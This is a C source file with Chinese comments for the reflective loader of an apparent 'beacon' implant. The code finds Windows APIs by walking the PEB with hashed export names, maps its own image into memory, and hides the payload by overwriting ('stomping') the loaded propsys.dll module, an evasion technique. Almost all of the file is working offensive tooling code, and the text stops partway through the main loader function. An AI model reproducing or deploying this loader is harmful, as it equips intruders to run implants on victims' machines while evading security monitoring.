#include "beacon_reflective_loader.h"

#include <intrin.h>

/* x86 DLL 导出转发：REFLoader → _REFLoader@4 */
#if defined(BEACON_DLL_BUILD) && defined(_M_IX86)
#pragma comment(linker, "/EXPORT:REFLoader=_REFLoader@4")
#endif

/* ===== 内部宏 ===== */

/* 从基址 + RVA 计算指针 */
#define REF_RVA(type, base, rva) ((type)((ULONG_PTR)(base) + (ULONG_PTR)(rva)))

/* 内核 API 的组合哈希常量（= HashModule + HashFunc，与 api.c 算法一致） */
#define REF_HASH_KERNEL32_LOADLIBRARYA        0xB40AB67AUL
#define REF_HASH_KERNEL32_GETPROCADDRESS      0xEBF0E4E4UL
#define REF_HASH_KERNEL32_VIRTUALALLOC        0x45B0A6F4UL
#define REF_HASH_KERNEL32_VIRTUALPROTECT      0xBDFFF23DUL
#define REF_HASH_KERNEL32_GETNATIVESYSTEMINFO 0x12B46986UL
#define REF_HASH_KERNEL32_GETMODULEHANDLEA    0x40B1B383UL
#define REF_HASH_KERNEL32_FLUSHICACHE         0x87DB48AEUL
#define REF_HASH_NTDLL_RTLADDFUNCTIONTABLE    0x3CE52CDAUL

/* 自身扫描最大范围（64MB） */
#define REF_MAX_SELF_SCAN (64UL * 1024UL * 1024UL)

/* ===== 内部类型定义 ===== */

typedef struct _REF_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} REF_UNICODE_STRING;

typedef struct _REF_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} REF_PEB_LDR_DATA;

typedef struct _REF_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    REF_UNICODE_STRING  FullDllName;
    REF_UNICODE_STRING  BaseDllName;
} REF_LDR_DATA_TABLE_ENTRY;

typedef struct _REF_PEB {
    BYTE              Reserved1[2];
    BYTE              BeingDebugged;
    BYTE              Reserved2[1];
    PVOID             Reserved3[2];
    REF_PEB_LDR_DATA* Ldr;
} REF_PEB;

/* 反射加载所需 API 函数指针表 */
typedef struct _REF_API_TABLE {
    HMODULE(WINAPI* LoadLibraryA)(LPCSTR lpLibFileName);
    FARPROC(WINAPI* GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
    LPVOID(WINAPI* VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    BOOL(WINAPI* VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    VOID(WINAPI* GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
    BOOL(WINAPI* FlushInstructionCache)(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
    HMODULE(WINAPI* GetModuleHandleA)(LPCSTR lpModuleName);
#if defined(_WIN64)
    BOOLEAN(WINAPI* RtlAddFunctionTable)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
#endif
} REF_API_TABLE;

typedef BOOL(WINAPI* REF_DLL_MAIN)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

/* ===== PEB 访问 ===== */

/* 获取当前进程 PEB 地址 */
static REF_PEB* RefGetPeb(VOID)
{
#if defined(_M_X64) || defined(__x86_64__)
    return (REF_PEB*)__readgsqword(0x60);
#elif defined(_M_IX86) || defined(__i386__)
    return (REF_PEB*)__readfsdword(0x30);
#else
    return NULL;
#endif
}

/* 获取当前指令地址（用于自身 PE 头扫描） */
__declspec(noinline) static ULONG_PTR RefCurrentInstructionAddress(VOID)
{
    return (ULONG_PTR)_ReturnAddress();
}

/* ===== 内存/字符串工具 ===== */

/* 向上对齐到指定粒度 */
static SIZE_T RefAlignUp(SIZE_T value, SIZE_T alignment)
{
    return (value + alignment - 1) & ~(alignment - 1);
}

/* 返回两个 SIZE_T 中的较大值 */
static SIZE_T RefMaxSize(SIZE_T a, SIZE_T b)
{
    return a > b ? a : b;
}

/* FNV-1a + rotate 混合哈希（与 api.c HashString 一致） */
static DWORD RefHashAscii(const CHAR* text, BOOL uppercase)
{
    DWORD hash = 0x811C9DC5u ^ 0x5A17B3C9u;

    while (*text) {
        BYTE ch = (BYTE)*text++;

        if (uppercase && ch >= 'a' && ch <= 'z') {
            ch -= ('a' - 'A');
        }

        hash ^= ch;
        hash *= 0x01000193u;
        hash = (hash >> 13) | (hash << 19);
    }

    hash ^= hash >> 16;
    hash *= 0x7FEB352Du;
    hash ^= hash >> 15;

    return hash;
}

/* Unicode 模块名哈希（取低字节 + FNV-1a + rotate，大小写不敏感） */
static DWORD RefHashUnicodeModuleName(const REF_UNICODE_STRING* name)
{
    DWORD hash = 0x811C9DC5u ^ 0x5A17B3C9u;
    USHORT count;
    USHORT i;

    if (!name || !name->Buffer) {
        return 0;
    }

    count = name->Length / sizeof(WCHAR);
    for (i = 0; i < count; ++i) {
        WCHAR wc = name->Buffer[i];
        BYTE ch = (BYTE)(wc & 0xff);

        if (ch >= 'a' && ch <= 'z') {
            ch -= ('a' - 'A');
        }

        hash ^= ch;
        hash *= 0x01000193u;
        hash = (hash >> 13) | (hash << 19);
    }

    hash ^= hash >> 16;
    hash *= 0x7FEB352Du;
    hash ^= hash >> 15;

    return hash;
}

/* ASCII 字符串精确比较 */
static INT RefAsciiEqual(const CHAR* a, const CHAR* b)
{
    while (*a && *b) {
        if (*a != *b) {
            return 0;
        }
        ++a;
        ++b;
    }

    return *a == *b;
}

/* ASCII 字符串与 Unicode 模块名的大小写不敏感比较 */
static INT RefAsciiCaseEqualUnicode(const CHAR* ascii, const WCHAR* wide, USHORT wideBytes)
{
    USHORT count = wideBytes / sizeof(WCHAR);
    USHORT i;

    if (!ascii || !wide) {
        return 0;
    }

    for (i = 0; i < count; ++i) {
        BYTE a = (BYTE)ascii[i];
        BYTE b = (BYTE)(wide[i] & 0xff);

        if (!a) {
            return 0;
        }

        /* 大小写不敏感比较 */
        if (a >= 'a' && a <= 'z') a -= ('a' - 'A');
        if (b >= 'a' && b <= 'z') b -= ('a' - 'A');

        if (a != b) {
            return 0;
        }
    }

    return ascii[count] == '\0';
}

/* 逐字节复制内存（volatile 防止编译器优化） */
__declspec(noinline) static VOID RefCopyMemory(PBYTE dst, const PBYTE src, SIZE_T size)
{
    volatile BYTE* d = (volatile BYTE*)dst;
    const volatile BYTE* s = (const volatile BYTE*)src;
    SIZE_T i;

    for (i = 0; i < size; ++i) {
        d[i] = s[i];
    }
}

/* 逐字节清零内存（volatile 防止编译器优化） */
__declspec(noinline) static VOID RefZeroMemory(PBYTE dst, SIZE_T size)
{
    volatile BYTE* d = (volatile BYTE*)dst;
    SIZE_T i;

    for (i = 0; i < size; ++i) {
        d[i] = 0;
    }
}

/* 检查字符串中是否包含 '.' */
static INT RefHasDot(const CHAR* text)
{
    while (*text) {
        if (*text == '.') {
            return 1;
        }
        ++text;
    }

    return 0;
}

/* 解析序号字符串（如 "#123" → 123） */
static WORD RefParseOrdinal(const CHAR* text)
{
    WORD value = 0;

    while (*text >= '0' && *text <= '9') {
        value = (WORD)((value * 10) + (*text - '0'));
        ++text;
    }

    return value;
}

/* ===== 模块/导出查找 ===== */

/* 从 PEB 已加载模块列表中按名称查找模块基址 */
static PVOID RefFindLoadedModuleByName(const CHAR* moduleName)
{
    REF_PEB* peb = RefGetPeb();
    PLIST_ENTRY head;
    PLIST_ENTRY item;

    if (!peb || !peb->Ldr) {
        return NULL;
    }

    /* 遍历 InLoadOrderModuleList */
    head = &peb->Ldr->InLoadOrderModuleList;
    for (item = head->Flink; item != head; item = item->Flink) {
        REF_LDR_DATA_TABLE_ENTRY* entry;

        entry = CONTAINING_RECORD(item, REF_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (entry->DllBase &&
            RefAsciiCaseEqualUnicode(moduleName, entry->BaseDllName.Buffer, entry->BaseDllName.Length)) {
            return entry->DllBase;
        }
    }

    return NULL;
}

/* 获取模块的导出目录 */
static PIMAGE_EXPORT_DIRECTORY RefGetExportDirectory(PBYTE moduleBase, PDWORD exportRva, PDWORD exportSize)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;

    if (!moduleBase) {
        return NULL;
    }

    /* 验证 DOS 签名 */
    dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    /* 验证 NT 签名 */
    nt = REF_RVA(PIMAGE_NT_HEADERS, moduleBase, dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    /* 获取导出目录 RVA 和大小 */
    *exportRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    *exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!*exportRva || !*exportSize) {
        return NULL;
    }

    return REF_RVA(PIMAGE_EXPORT_DIRECTORY, moduleBase, *exportRva);
}

/* 前向声明 */
static FARPROC RefFindExportByNameDepth(PBYTE moduleBase, const CHAR* name, INT depth);
static FARPROC RefFindExportByOrdinalDepth(PBYTE moduleBase, WORD ordinal, INT depth);

/* 解析转发导出（如 "ntdll.RtlAllocateHeap"） */
static FARPROC RefResolveForwarder(const CHAR* forwarder, INT depth)
{
    CHAR moduleName[80];
    CHAR exportName[160];
    SIZE_T i = 0;
    SIZE_T moduleLen;
    SIZE_T j = 0;
    PBYTE moduleBase;

    if (!forwarder || depth > 8) {
        return NULL;
    }

    /* 提取模块名（'.' 之前的部分） */
    while (forwarder[i] && forwarder[i] != '.' && i < sizeof(moduleName) - 5) {
        moduleName[i] = forwarder[i];
        ++i;
    }
    if (forwarder[i] != '.') {
        return NULL;
    }
    moduleLen = i;
    moduleName[i] = '\0';

    /* 如果模块名没有扩展名，追加 ".dll" */
    if (!RefHasDot(moduleName)) {
        moduleName[moduleLen++] = '.';
        moduleName[moduleLen++] = 'd';
        moduleName[moduleLen++] = 'l';
        moduleName[moduleLen++] = 'l';
        moduleName[moduleLen]   = '\0';
    }

    /* 提取函数名（'.' 之后的部分） */
    ++i;
    while (forwarder[i] && j < sizeof(exportName) - 1) {
        exportName[j++] = forwarder[i++];
    }
    exportName[j] = '\0';

    /* 查找目标模块 */
    moduleBase = (PBYTE)RefFindLoadedModuleByName(moduleName);
    if (!moduleBase) {
        return NULL;
    }

    /* 按序号或名称解析 */
    if (exportName[0] == '#') {
        return RefFindExportByOrdinalDepth(moduleBase, RefParseOrdinal(exportName + 1), depth + 1);
    }

    return RefFindExportByNameDepth(moduleBase, exportName, depth + 1);
}

/* 从 RVA 获取导出地址（如果是转发则解析转发） */
static FARPROC RefExportAddressFromRva(PBYTE moduleBase, DWORD addressRva, DWORD exportRva, DWORD exportSize, INT depth)
{
    /* RVA 在导出目录范围内 → 转发导出 */
    if (addressRva >= exportRva && addressRva < exportRva + exportSize) {
        return RefResolveForwarder((const CHAR*)REF_RVA(PBYTE, moduleBase, addressRva), depth + 1);
    }

    return (FARPROC)REF_RVA(PBYTE, moduleBase, addressRva);
}

/* 按名称查找导出函数（递归，最大深度 8） */
static FARPROC RefFindExportByNameDepth(PBYTE moduleBase, const CHAR* name, INT depth)
{
    DWORD exportRva;
    DWORD exportSize;
    PIMAGE_EXPORT_DIRECTORY exports;
    PDWORD names;
    PDWORD functions;
    PWORD ordinals;
    DWORD i;

    if (depth > 8) {
        return NULL;
    }

    exports = RefGetExportDirectory(moduleBase, &exportRva, &exportSize);
    if (!exports) {
        return NULL;
    }

    names     = REF_RVA(PDWORD, moduleBase, exports->AddressOfNames);
    functions = REF_RVA(PDWORD, moduleBase, exports->AddressOfFunctions);
    ordinals  = REF_RVA(PWORD, moduleBase, exports->AddressOfNameOrdinals);

    /* 遍历导出名称表 */
    for (i = 0; i < exports->NumberOfNames; ++i) {
        const CHAR* exportName = (const CHAR*)REF_RVA(PBYTE, moduleBase, names[i]);

        if (RefAsciiEqual(exportName, name)) {
            DWORD addressRva = functions[ordinals[i]];
            return RefExportAddressFromRva(moduleBase, addressRva, exportRva, exportSize, depth);
        }
    }

    return NULL;
}

/* 按序号查找导出函数（递归，最大深度 8） */
static FARPROC RefFindExportByOrdinalDepth(PBYTE moduleBase, WORD ordinal, INT depth)
{
    DWORD exportRva;
    DWORD exportSize;
    PIMAGE_EXPORT_DIRECTORY exports;
    PDWORD functions;
    DWORD index;

    if (depth > 8) {
        return NULL;
    }

    exports = RefGetExportDirectory(moduleBase, &exportRva, &exportSize);
    if (!exports) {
        return NULL;
    }

    /* 验证序号范围 */
    if (ordinal < exports->Base) {
        return NULL;
    }

    index = (DWORD)ordinal - exports->Base;
    if (index >= exports->NumberOfFunctions) {
        return NULL;
    }

    functions = REF_RVA(PDWORD, moduleBase, exports->AddressOfFunctions);
    return RefExportAddressFromRva(moduleBase, functions[index], exportRva, exportSize, depth);
}

/* 通过组合哈希（模块哈希 + 函数哈希）在所有已加载模块中查找导出 */
static FARPROC RefFindExportByHash(DWORD combinedHash)
{
    REF_PEB* peb = RefGetPeb();
    PLIST_ENTRY head;
    PLIST_ENTRY item;

    if (!peb || !peb->Ldr) {
        return NULL;
    }

    head = &peb->Ldr->InLoadOrderModuleList;
    for (item = head->Flink; item != head; item = item->Flink) {
        REF_LDR_DATA_TABLE_ENTRY* entry;
        PBYTE moduleBase;
        DWORD moduleHash;
        DWORD exportRva;
        DWORD exportSize;
        PIMAGE_EXPORT_DIRECTORY exports;
        PDWORD names;
        PDWORD functions;
        PWORD ordinals;
        DWORD i;

        entry = CONTAINING_RECORD(item, REF_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        moduleBase = (PBYTE)entry->DllBase;
        if (!moduleBase) {
            continue;
        }

        exports = RefGetExportDirectory(moduleBase, &exportRva, &exportSize);
        if (!exports) {
            continue;
        }

        moduleHash = RefHashUnicodeModuleName(&entry->BaseDllName);
        names     = REF_RVA(PDWORD, moduleBase, exports->AddressOfNames);
        functions = REF_RVA(PDWORD, moduleBase, exports->AddressOfFunctions);
        ordinals  = REF_RVA(PWORD, moduleBase, exports->AddressOfNameOrdinals);

        /* 遍历该模块的所有导出名称 */
        for (i = 0; i < exports->NumberOfNames; ++i) {
            const CHAR* exportName = (const CHAR*)REF_RVA(PBYTE, moduleBase, names[i]);
            DWORD exportHash = moduleHash + RefHashAscii(exportName, FALSE);

            if (exportHash == combinedHash) {
                DWORD addressRva = functions[ordinals[i]];
                return RefExportAddressFromRva(moduleBase, addressRva, exportRva, exportSize, 0);
            }
        }
    }

    return NULL;
}

/* 解析反射加载所需的最小 API 集 */
static BOOL RefResolveApis(REF_API_TABLE* api)
{
    api->LoadLibraryA        = (HMODULE(WINAPI*)(LPCSTR))RefFindExportByHash(REF_HASH_KERNEL32_LOADLIBRARYA);
    api->GetProcAddress      = (FARPROC(WINAPI*)(HMODULE, LPCSTR))RefFindExportByHash(REF_HASH_KERNEL32_GETPROCADDRESS);
    api->VirtualAlloc        = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))RefFindExportByHash(REF_HASH_KERNEL32_VIRTUALALLOC);
    api->VirtualProtect      = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))RefFindExportByHash(REF_HASH_KERNEL32_VIRTUALPROTECT);
    api->GetNativeSystemInfo = (VOID(WINAPI*)(LPSYSTEM_INFO))RefFindExportByHash(REF_HASH_KERNEL32_GETNATIVESYSTEMINFO);
    api->FlushInstructionCache = (BOOL(WINAPI*)(HANDLE, LPCVOID, SIZE_T))RefFindExportByHash(REF_HASH_KERNEL32_FLUSHICACHE);
    api->GetModuleHandleA    = (HMODULE(WINAPI*)(LPCSTR))RefFindExportByHash(REF_HASH_KERNEL32_GETMODULEHANDLEA);

#if defined(_WIN64)
    api->RtlAddFunctionTable = (BOOLEAN(WINAPI*)(PRUNTIME_FUNCTION, DWORD, DWORD64))RefFindExportByHash(REF_HASH_NTDLL_RTLADDFUNCTIONTABLE);
#endif

    return api->LoadLibraryA &&
           api->GetProcAddress &&
           api->VirtualAlloc &&
           api->VirtualProtect &&
           api->GetNativeSystemInfo &&
           api->FlushInstructionCache;
}

/* ===== PE 映像处理 ===== */

/* 从当前指令地址向前扫描，找到自身的 PE 头 */
static PIMAGE_NT_HEADERS RefFindSelfNtHeaders(PBYTE* imageBase)
{
    ULONG_PTR cursor = RefCurrentInstructionAddress();
    SIZE_T scanned;

    for (scanned = 0; scanned < REF_MAX_SELF_SCAN; ++scanned, --cursor) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cursor;
        PIMAGE_NT_HEADERS nt;

        /* 检查 DOS 签名 */
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            continue;
        }
        if (dos->e_lfanew < (LONG)sizeof(IMAGE_DOS_HEADER) || dos->e_lfanew > 0x10000) {
            continue;
        }

        /* 检查 NT 签名 */
        nt = REF_RVA(PIMAGE_NT_HEADERS, cursor, dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            continue;
        }

        /* 验证可选头魔数 */
#if defined(_WIN64)
        if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            continue;
        }
#else
        if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
            continue;
        }
#endif

        *imageBase = (PBYTE)cursor;
        return nt;
    }

    return NULL;
}

/* 应用基址重定位 */
static BOOL RefApplyRelocations(PBYTE imageBase, PIMAGE_NT_HEADERS nt, ULONG_PTR delta)
{
    PIMAGE_DATA_DIRECTORY dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD processed = 0;

    /* 偏移为零则无需重定位 */
    if (!delta) {
        return TRUE;
    }

    if (!dir->VirtualAddress || !dir->Size) {
        return FALSE;
    }

    /* 遍历重定位块 */
    while (processed < dir->Size) {
        PIMAGE_BASE_RELOCATION block;
        DWORD entryCount;
        DWORD i;
        PWORD reloc;

        block = REF_RVA(PIMAGE_BASE_RELOCATION, imageBase, dir->VirtualAddress + processed);
        if (!block->SizeOfBlock || block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
            break;
        }

        entryCount = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        reloc = (PWORD)(block + 1);

        /* 遍历重定位条目 */
        for (i = 0; i < entryCount; ++i) {
            WORD type   = reloc[i] >> 12;
            WORD offset = reloc[i] & 0x0fff;
            PBYTE patch = imageBase + block->VirtualAddress + offset;

            if (type == IMAGE_REL_BASED_ABSOLUTE) {
                /* no-op */
            }
#if defined(_WIN64)
            else if (type == IMAGE_REL_BASED_DIR64) {
                *(ULONGLONG*)patch += (ULONGLONG)delta;
            }
#else
            else if (type == IMAGE_REL_BASED_HIGHLOW) {
                *(DWORD*)patch += (DWORD)delta;
            }
#endif
            else if (type == IMAGE_REL_BASED_HIGH) {
                *(WORD*)patch += HIWORD(delta);
            }
            else if (type == IMAGE_REL_BASED_LOW) {
                *(WORD*)patch += LOWORD(delta);
            }
            else {
                return FALSE;
            }
        }

        processed += block->SizeOfBlock;
    }

    return TRUE;
}

/* 解析导入表（加载 DLL + 填充 IAT） */
static BOOL RefResolveImports(PBYTE imageBase, PIMAGE_NT_HEADERS nt, REF_API_TABLE* api)
{
    PIMAGE_DATA_DIRECTORY dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR importDesc;

    if (!dir->VirtualAddress || !dir->Size) {
        return TRUE;
    }

    importDesc = REF_RVA(PIMAGE_IMPORT_DESCRIPTOR, imageBase, dir->VirtualAddress);

    /* 遍历导入描述符 */
    while (importDesc->Name) {
        LPCSTR dllName = (LPCSTR)REF_RVA(PBYTE, imageBase, importDesc->Name);
        HMODULE module = api->LoadLibraryA(dllName);
        PIMAGE_THUNK_DATA thunk;
        PIMAGE_THUNK_DATA iat;

        if (!module) {
            return FALSE;
        }

        /* 获取原始 thunk 和 IAT */
        if (importDesc->OriginalFirstThunk) {
            thunk = REF_RVA(PIMAGE_THUNK_DATA, imageBase, importDesc->OriginalFirstThunk);
        } else {
            thunk = REF_RVA(PIMAGE_THUNK_DATA, imageBase, importDesc->FirstThunk);
        }
        iat = REF_RVA(PIMAGE_THUNK_DATA, imageBase, importDesc->FirstThunk);

        /* 遍历 thunk 并填充 IAT */
        while (thunk->u1.AddressOfData) {
            FARPROC proc;

            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                proc = api->GetProcAddress(module, (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME importName;
                importName = REF_RVA(PIMAGE_IMPORT_BY_NAME, imageBase, thunk->u1.AddressOfData);
                proc = api->GetProcAddress(module, importName->Name);
            }

            if (!proc) {
                return FALSE;
            }

            iat->u1.Function = (ULONG_PTR)proc;
            ++thunk;
            ++iat;
        }

        ++importDesc;
    }

    return TRUE;
}

/* 根据节区特征计算内存保护属性 */
static DWORD RefProtectionFromSection(DWORD characteristics)
{
    BOOL executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL readable   = (characteristics & IMAGE_SCN_MEM_READ)    != 0;
    BOOL writable   = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;
    DWORD protect;

    if      (!executable && !readable && !writable) protect = PAGE_NOACCESS;
    else if (!executable && !readable &&  writable) protect = PAGE_WRITECOPY;
    else if (!executable &&  readable && !writable) protect = PAGE_READONLY;
    else if (!executable &&  readable &&  writable) protect = PAGE_READWRITE;
    else if ( executable && !readable && !writable) protect = PAGE_EXECUTE;
    else if ( executable && !readable &&  writable) protect = PAGE_EXECUTE_WRITECOPY;
    else if ( executable &&  readable && !writable) protect = PAGE_EXECUTE_READ;
    else                                            protect = PAGE_EXECUTE_READWRITE;

    if (characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
        protect |= PAGE_NOCACHE;
    }

    return protect;
}

/* 设置各节区的内存保护属性（两遍：先可执行节区，再非可执行节区） */
static BOOL RefProtectSections(PBYTE imageBase, PIMAGE_NT_HEADERS nt, REF_API_TABLE* api)
{
    const DWORD pageSize = 0x1000;
    PIMAGE_SECTION_HEADER section;
    DWORD oldProtect;
    WORD i;
    INT pass;

    /* 头部设为只读 */
    api->VirtualProtect(imageBase, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);

    /* 两遍处理：pass=0 可执行节区，pass=1 非可执行节区 */
    for (pass = 0; pass < 2; ++pass) {
        section = IMAGE_FIRST_SECTION(nt);

        for (i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++section) {
            SIZE_T sectionSize = RefMaxSize(section->Misc.VirtualSize, section->SizeOfRawData);
            DWORD protect;
            BOOL executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

            if ((pass == 0 && executable) || (pass == 1 && !executable)) {
                continue;
            }

            if (!sectionSize) {
                continue;
            }

            sectionSize = RefAlignUp(sectionSize, pageSize);
            protect = RefProtectionFromSection(section->Characteristics);
            api->VirtualProtect(imageBase + section->VirtualAddress, sectionSize, protect, &oldProtect);
        }
    }

    return TRUE;
}

/* 调用 TLS 回调 */
static VOID RefCallTlsCallbacks(PBYTE imageBase, PIMAGE_NT_HEADERS nt)
{
    PIMAGE_DATA_DIRECTORY dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    PIMAGE_TLS_DIRECTORY tls;
    PIMAGE_TLS_CALLBACK* callback;

    if (!dir->VirtualAddress || !dir->Size) {
        return;
    }

    tls = REF_RVA(PIMAGE_TLS_DIRECTORY, imageBase, dir->VirtualAddress);
    if (!tls->AddressOfCallBacks) {
        return;
    }

    /* 遍历 TLS 回调数组 */
    callback = (PIMAGE_TLS_CALLBACK*)(ULONG_PTR)tls->AddressOfCallBacks;
    while (*callback) {
        (*callback)((LPVOID)imageBase, DLL_PROCESS_ATTACH, NULL);
        ++callback;
    }
}

/* 注册异常处理表（x64 SEH） */
static VOID RefRegisterExceptionTable(PBYTE imageBase, PIMAGE_NT_HEADERS nt, REF_API_TABLE* api)
{
#if defined(_WIN64)
    PIMAGE_DATA_DIRECTORY dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

    if (api->RtlAddFunctionTable && dir->VirtualAddress && dir->Size) {
        PRUNTIME_FUNCTION functions = REF_RVA(PRUNTIME_FUNCTION, imageBase, dir->VirtualAddress);
        DWORD count = dir->Size / sizeof(RUNTIME_FUNCTION);

        api->RtlAddFunctionTable(functions, count, (DWORD64)imageBase);
    }
#else
    (void)imageBase;
    (void)nt;
    (void)api;
#endif
}

/* ===== 模块践踏内存分配 ===== */

/*
 * 通过模块践踏技术分配可执行内存
 * 优先加载 propsys.dll 并践踏其内存（~1MB），失败则回退到 VirtualAlloc
 * 与 command_bof.c 中的 BofModuleStomping 策略一致
 */
static PVOID RefModuleStomping(REF_API_TABLE* api, SIZE_T size)
{
#if defined(BEACON_REFLECTIVE_NO_STOMP)
    return api->VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
#else
    HMODULE hModule = NULL;
    PVOID pvBuffer = NULL;
    DWORD oldProtect = 0;
    CHAR propsysName[12];

    /*
     * REFLoader 执行时 source image 还没有重定位。这里必须在栈上构造
     * DLL 名称，避免 x86 代码引用原始 .rdata VA。
     */
    ((DWORD*)propsysName)[0] = 0x706F7270; /* prop */
    ((DWORD*)propsysName)[1] = 0x2E737973; /* sys. */
    ((DWORD*)propsysName)[2] = 0x006C6C64; /* dll\0 */

    /* 尝试加载 propsys.dll（已加载则直接返回现有句柄，~1MB 大小） */
    hModule = api->LoadLibraryA(propsysName);

    if (hModule) {
        /* 检查模块大小是否足够 */
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS nt;
        SIZE_T imageSize = 0;

        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            nt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) {
                imageSize = nt->OptionalHeader.SizeOfImage;
            }
        }

        /* 模块大小足够 → 践踏 */
        if (imageSize >= size) {
            pvBuffer = (PVOID)hModule;

            /* 修改内存保护为可读写 */
            if (api->VirtualProtect(pvBuffer, size, PAGE_READWRITE, &oldProtect)) {
                /* 清零模块内存 */
                RefZeroMemory(pvBuffer, size);
                return pvBuffer;
            }
        }
    }

    /* 回退：直接 VirtualAlloc */
    pvBuffer = api->VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    return pvBuffer;
#endif
}

/* ===== 反射加载主入口 ===== */

/*
 * REFLoader - 反射式 DLL 加载器
 * 无需标准导入表，通过 PEB 遍历解析 API，完成：
 * 1. 定位自身 PE 头
 * 2. 解析最小 API 集
 * 3. 分配内存并映射节区
 * 4. 应用重定位
 * 5. 解析导入表
 * 6. 注册异常表
 * 7. 设置内存保护
 * 8. 调用 TLS 回调和入口点
 */
BEACON_REFLECTIVE_EXPORT ULONG_PTR WINAPI REFLoader(LPVOID lpParameter)
{
    REF_API_TABLE api;
    PBYTE sourceBase = NULL;
    PIMAGE_NT_HEADERS sourceNt;
    PBYTE mappedBase;
    PIMAGE_NT_HEADERS mappedNt;
    PIMAGE_SECTION_HEADER section;
    ULONG_PTR delta;
    WORD i;

    /* 1. 定位自身 PE 头 */
    sourceNt = RefFindSelfNtHeaders(&sourceBase);
    if (!sourceNt) {
        return 0;
    }

    ///* 2. 解析最小 API 集 */
    if (!RefResolveApis(&api)) {
        return 0;
    }

    /* 3. 分配内存（模块践踏优先，回退 VirtualAlloc） */
    mappedBase = (PBYTE)RefModuleStomping(&api, sourceNt->OptionalHeader.SizeOfImage);
    if (!mappedBase) {
        return 0;
    }

    ///* 4. 复制头部和节区 */
    RefCopyMemory(mappedBase, sourceBase, sourceNt->OptionalHeader.SizeOfHeaders);

    section = IMAGE_FIRST_SECTION(sourceNt);
    for (i = 0; i < sourceNt->FileHeader.NumberOfSections; ++i, ++section) {
        if (section->SizeOfRawData && section->PointerToRawData) {
            RefCopyMemory(
                mappedBase + section->VirtualAddress,
                sourceBase + section->PointerToRawData,
                section->SizeOfRawData);
        }
    }

    /* 5. 计算基址偏移 */
    mappedNt = REF_RVA(PIMAGE_NT_HEADERS, mappedBase, ((PIMAGE_DOS_HEADER)mappedBase)->e_lfanew);
    delta = (ULONG_PTR)mappedBase - (ULONG_PTR)mappedNt->OptionalHeader.ImageBase;

    /* 6. 应用重定位 */
    if (!RefApplyRelocations(mappedBase, mappedNt, delta)) {
        return 0;
    }

    /* 7. 解析导入表 */
    if (!RefResolveImports(mappedBase, mappedNt, &api)) {
        return 0;
    }

    /* 8. 注册异常处理表 */
    RefRegisterExceptionTable(mappedBase, mappedNt, &api);

    /* 9. 设置节区保护属性 */
    if (!RefProtectSections(mappedBase, mappedNt, &api)) {
        return 0;
    }

    /* 10. 刷新指令缓存 */
    api.FlushInstructionCache((HANDLE)(LONG_PTR)-1, mappedBase, mappedNt->OptionalHeader.SizeOfImage);

    /* 11. 调用 TLS 回调 */
